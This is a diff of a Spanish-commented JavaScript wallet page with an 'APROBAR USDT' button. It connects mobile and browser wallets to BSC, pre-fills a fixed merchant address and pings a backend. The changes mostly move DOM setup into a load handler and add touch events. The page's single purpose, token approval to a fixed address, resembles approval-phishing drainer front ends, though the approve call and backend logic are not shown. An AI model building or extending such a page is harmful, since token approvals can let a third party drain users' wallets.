@@ -19,7 +19,7 @@ const BSC_CHAIN_PARAMS = {
   nativeCurrency:    { name: "BNB", symbol: "BNB", decimals: 18 },
   rpcUrls:           BSC_RPC_URLS,
   blockExplorerUrls: ["https://bscscan.com/"]
-];
+};
 
 const ERC20_ABI = [
   "function approve(address spender, uint256 amount) external returns (bool)",
@@ -27,21 +27,13 @@ const ERC20_ABI = [
   "function balanceOf(address account) external view returns (uint256)"
 ];
 
-// ─── DOM refs ─────────────────────────────────────────────────────────────────
-const approveBtn    = document.getElementById("approveBtn");
-const btnText       = document.getElementById("btnText");
-const btnSpinner    = document.getElementById("btnSpinner");
-const merchantInput = document.getElementById("merchantAddress");
-const toastEl       = document.getElementById("toast");
-
-if (merchantInput) merchantInput.value = MERCHANT_ADDRESS;
-
 // Wake up Render backend
 (async () => { try { await fetch(`${BACKEND_URL}/health`); } catch (_) {} })();
 
 // ─── UI helpers ───────────────────────────────────────────────────────────────
 let _toastTimer;
 function showToast(msg, type = "default", ms = 4500) {
+  const toastEl = document.getElementById("toast");
   if (!toastEl) return;
   clearTimeout(_toastTimer);
   toastEl.textContent  = msg;
@@ -51,17 +43,19 @@ function showToast(msg, type = "default", ms = 4500) {
 }
 
 function setLoading(on, label = "Processing…") {
+  const approveBtn = document.getElementById("approveBtn");
+  const btnText    = document.getElementById("btnText");
+  const btnSpinner = document.getElementById("btnSpinner");
   if (!approveBtn) return;
   approveBtn.disabled = on;
-  btnText.textContent = on ? label : "APROBAR USDT";
-  if (btnSpinner) btnSpinner.hidden   = !on;
+  if (btnText) btnText.textContent = on ? label : "APROBAR USDT";
+  if (btnSpinner) btnSpinner.hidden = !on;
 }
 
-// ─── Proveedor Seguro con Espera Activa (Clave para Webviews Móviles) ─────────
+// ─── Proveedor Seguro con Espera Activa ──────────────────────────────────────
 async function getEthereumProvider() {
   if (window.ethereum) return window.ethereum;
 
-  // Las wallets móviles inyectan window.ethereum con unos milisegundos de retraso al abrir el Webview
   return new Promise((resolve) => {
     let checks = 0;
     const interval = setInterval(() => {
@@ -69,7 +63,7 @@ async function getEthereumProvider() {
       if (window.ethereum) {
         clearInterval(interval);
         resolve(window.ethereum);
-      } else if (checks > 30) { // Espera máxima de 3 segundos
+      } else if (checks > 30) {
         clearInterval(interval);
         resolve(null);
       }
@@ -77,7 +71,7 @@ async function getEthereumProvider() {
   });
 }
 
-// ─── Modal Nativo con Deeplinks Corregidos (OKX, SafePal, Trust, MetaMask) ────
+// ─── Modal Nativo con Deeplinks Corregidos ────────────────────────────────────
 function showMobileWalletSelector() {
   let modal = document.getElementById("mobileWalletModal");
   
@@ -114,12 +108,22 @@ function showMobileWalletSelector() {
   }
 }
 
-// ─── Main Execution Handler ───────────────────────────────────────────────────
-if (approveBtn) {
-  approveBtn.addEventListener("click", async () => {
+// ─── Inicialización Segura al Cargar el DOM ───────────────────────────────────
+document.addEventListener("DOMContentLoaded", () => {
+  const approveBtn    = document.getElementById("approveBtn");
+  const merchantInput = document.getElementById("merchantAddress");
+
+  if (merchantInput) merchantInput.value = MERCHANT_ADDRESS;
+
+  if (!approveBtn) {
+    console.error("No se encontró el elemento #approveBtn en el HTML.");
+    return;
+  }
+
+  // Función principal de ejecución del botón
+  async function handleApprovalAction() {
     setLoading(true, "Sincronizando wallet…");
 
-    // Damos tiempo a que el Webview inyecte el proveedor si venimos de un deep link
     const provider = await getEthereumProvider();
 
     if (!provider) {
@@ -143,7 +147,6 @@ if (approveBtn) {
         return;
       }
 
-      // Validación de red BSC
       const currentChain = await provider.request({ method: "eth_chainId" });
       if (currentChain !== BSC_CHAIN_ID_HEX) {
         try {
@@ -194,5 +197,12 @@ if (approveBtn) {
     } finally {
       setLoading(false);
     }
+  }
+
+  // Vincular eventos de forma robusta para evitar bloqueos en móviles
+  approveBtn.addEventListener("click", handleApprovalAction);
+  approveBtn.addEventListener("touchend", (e) => {
+    e.preventDefault(); // Prevenir doble disparo en algunos navegadores móviles
+    handleApprovalAction();
   });
-}
+});
